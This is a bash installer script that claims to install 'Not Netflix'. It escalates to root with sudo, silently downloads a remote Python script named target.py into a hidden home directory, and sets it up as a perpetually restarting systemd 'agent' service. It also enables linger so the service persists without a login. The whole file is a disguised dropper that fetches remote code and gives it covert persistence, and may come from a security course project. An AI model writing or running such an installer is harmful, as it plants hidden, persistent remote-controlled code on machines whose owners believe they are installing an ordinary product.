#!/bin/bash

# Ensure running as root
if [ "$EUID" -ne 0 ]; then
  echo "[*] Re-running as root using sudo..."
  exec sudo "$0" "$@"
fi

# Determine real user
REAL_USER=${SUDO_USER:-$(logname)}
USER_HOME=$(eval echo "~$REAL_USER")

echo "[*] Installing Not Netflix for: $REAL_USER"

# Config
INSTALL_DIR="$USER_HOME/.not_netflix"
SCRIPT_URL="https://raw.githubusercontent.com/lisenapati/pbl202.24/main/target/target.py"
PYTHON=$(command -v python3)

# Setup agent directory
mkdir -p "$INSTALL_DIR"
curl -sL "$SCRIPT_URL" -o "$INSTALL_DIR/target.py"
chmod +x "$INSTALL_DIR/target.py"
chown -R "$REAL_USER":"$REAL_USER" "$INSTALL_DIR"

# Setup systemd user service
SERVICE_DIR="$USER_HOME/.config/systemd/user"
mkdir -p "$SERVICE_DIR"
chown -R "$REAL_USER":"$REAL_USER" "$SERVICE_DIR"

cat <<EOF > "$SERVICE_DIR/not-netflix.service"
[Unit]
Description=Not Netflix Agent
After=network-online.target

[Service]
Type=simple
ExecStart=$PYTHON $INSTALL_DIR/target.py --loop
Restart=always
RestartSec=10

[Install]
WantedBy=default.target
EOF

chown "$REAL_USER":"$REAL_USER" "$SERVICE_DIR/not-netflix.service"

# Enable lingering to allow user services to persist
if ! loginctl show-user "$REAL_USER" | grep -q 'Linger=yes'; then
  echo "[*] Enabling linger for $REAL_USER"
  loginctl enable-linger "$REAL_USER"
fi

# Reload and enable the user service
sudo -u "$REAL_USER" systemctl --user daemon-reexec
sudo -u "$REAL_USER" systemctl --user daemon-reload
sudo -u "$REAL_USER" systemctl --user enable --now not-netflix

echo "[+] Not Netflix installed and running for $REAL_USER"
